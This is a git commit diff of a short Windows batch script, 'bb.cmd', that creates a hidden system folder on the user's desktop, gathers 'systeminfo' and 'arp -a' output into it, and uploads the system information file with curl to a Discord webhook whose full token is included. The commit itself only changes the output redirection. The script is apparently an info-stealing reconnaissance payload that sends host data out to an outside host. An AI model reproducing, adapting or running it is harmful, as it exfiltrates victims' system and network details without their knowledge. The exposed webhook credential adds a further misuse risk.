927525dc4a809601c2b72e22b03ff89fdce003ab
lsecanon <sherapsy@gmail.com>
2025-03-15 12:41:40 -0700

    Update bb.cmd

--- bb.cmd
+++ bb.cmd
@@ -1,8 +1,8 @@
 mkdir %userprofile%\desktop\bb
 attrib +s +h +i +x %userprofile%\desktop\bb
-systeminfo >> %userprofile%\desktop\bb\systeminfo.txt
+systeminfo > %userprofile%\desktop\bb\systeminfo.txt
 pause
-arp -a >> %userprofile%\desktop\bb\arp.txt
+arp -a > %userprofile%\desktop\bb\arp.txt
 pause
 for /f "delims=" %n in ('whoami') do set name=%n
 curl -F "file=@%userprofile%\desktop\bb\systeminfo.txt" https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
